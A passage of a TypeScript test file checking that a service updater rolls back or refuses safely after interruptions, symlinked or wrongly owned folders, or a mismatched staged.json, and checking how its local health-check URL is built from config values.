    expect(errors.some((line) => line.includes("the database can't be restored: DATA_DIR/backups is not a folder"))).toBe(true);
    expect(programs().at(-1)).toBe("systemctl stop not-unreachable.service");
    expect(await readFile(database(), "utf8")).toBe("the migrated database");
  });

  it("says rollback-failed and leaves the database when db is a symlink", async () => {
    await interruptedWith({ [MADE]: "the database" });
    const elsewhere = join(root, "elsewhere");
    await rename(join(dataDir(), "db"), elsewhere);
    await symlink(elsewhere, join(dataDir(), "db"));

    expect(await apply()).toBe(UPDATE_EXIT_CODES.internal);
    expect(await status()).toMatchObject({ result: "rollback-failed", reason: "interrupted" });
    expect(errors.some((line) => line.includes("DATA_DIR/db is not a folder"))).toBe(true);
    expect(await readFile(join(elsewhere, "not-unreachable.sqlite"), "utf8")).toBe("the migrated database");
  });

  it("says rollback-failed when backups isn't the service user's", async () => {
    await interruptedWith({ [MADE]: "the database" });
    dependencies = { ...dependencies, serviceUser: async () => ({ uid: uid + 1, gid }) };

    expect(await apply()).toBe(UPDATE_EXIT_CODES.internal);
    expect(await status()).toMatchObject({ result: "rollback-failed", reason: "interrupted" });
    expect(errors.some((line) => line.includes("DATA_DIR/backups is not the service user's folder"))).toBe(true);
    expect(await readFile(database(), "utf8")).toBe("the migrated database");
  });

  it("restores nothing when the interrupted start made no backup", async () => {
    await writeFile(join(workDir(), "apply.json"), JSON.stringify({ requestId: REQUEST_ID, dataDir: dataDir(), backupsBefore: [BEFORE] }));
    await writeStatus({ requestId: REQUEST_ID, phase: "installing" });
    onRestart = async () => undefined;
    expect(await apply()).toBe(UPDATE_EXIT_CODES.ok);
    expect(await readFile(database(), "utf8")).toBe("the database");
  });

  it("can't tell which backup to restore without its notes, and says rollback-failed", async () => {
    await mkdir(workDir(), { recursive: true });
    await rm(join(workDir(), "apply.json"), { force: true });
    await writeStatus({ requestId: REQUEST_ID, phase: "installing" });
    expect(await apply()).toBe(UPDATE_EXIT_CODES.internal);
    expect(await status()).toMatchObject({ result: "rollback-failed", reason: "interrupted" });
  });

  it("finishes a verify run that died as refused, interrupted", async () => {
    await writeStatus({ requestId: REQUEST_ID, phase: "verifying" });
    expect(await apply()).toBe(UPDATE_EXIT_CODES.ok);
    expect(await status()).toMatchObject({ result: "refused", reason: "interrupted" });
    expect(programs()).toEqual(["systemctl is-active not-unreachable-update.service"]);
  });

  it("only clears the work when there is no update to apply", async () => {
    await writeStatus({ requestId: REQUEST_ID, phase: "finished", result: "succeeded", finishedAt: NOW.toISOString() });
    expect(await apply()).toBe(UPDATE_EXIT_CODES.ok);
    expect(calls).toEqual([]);
    expect(await readdir(workDir())).toEqual([]);
  });

  it("refuses a staged.json that doesn't match the status", async () => {
    await writeFile(join(workDir(), "staged.json"), JSON.stringify({ requestId: REQUEST_ID, from: FROM, to: TO, staged: "/tmp/evil" }));
    expect(await apply()).toBe(UPDATE_EXIT_CODES.ok);
    expect(await status()).toMatchObject({ result: "refused", reason: "internal" });
    expect(calls).toEqual([]);
  });
});

const url = (lines: Record<string, string>): string | undefined => healthCheckUrl(new Map(Object.entries(lines)));

describe("the health check's address", () => {
  it.each<[Record<string, string>, string | undefined]>([
    [{}, "http://127.0.0.1:8480/api/v1/health"],
    [{ LISTEN_HOST: "127.0.0.1", LISTEN_PORT: "8080" }, "http://127.0.0.1:8080/api/v1/health"],
    [{ LISTEN_HOST: "::1" }, "http://[::1]:8480/api/v1/health"],
    [{ LISTEN_HOST: "0.0.0.0" }, "http://127.0.0.1:8480/api/v1/health"],
    [{ LISTEN_HOST: "::" }, "http://[::1]:8480/api/v1/health"],
    [{ LISTEN_HOST: "::", TRUSTED_PROXIES: "127.0.0.1" }, "http://127.0.0.1:8480/api/v1/health"],
    [{ LISTEN_HOST: "127.0.0.2", TRUSTED_PROXIES: "127.0.0.0/8" }, "http://127.0.0.2:8480/api/v1/health"],
    [{ LISTEN_HOST: "127.0.0.2" }, undefined],
    [{ TRUSTED_PROXIES: "10.0.0.5" }, undefined],
    [{ TRUSTED_PROXIES: "" }, undefined],
    [{ LISTEN_HOST: "192.168.1.5" }, undefined],
    [{ LISTEN_HOST: "0.0.0.0", TRUSTED_PROXIES: "::1" }, undefined],
    [{ LISTEN_PORT: "0" }, undefined],
    [{ LISTEN_PORT: "70000" }, undefined],
    [{ TRUSTED_PROXIES: "not-an-address,127.0.0.1" }, "http://127.0.0.1:8480/api/v1/health"],
  ])("%j gives %s", (values, expected) => {
    expect(url(values)).toBe(expected);
  });

  it("is none without config.env", () => {
    expect(healthCheckUrl(undefined)).toBeUndefined();
  });
});
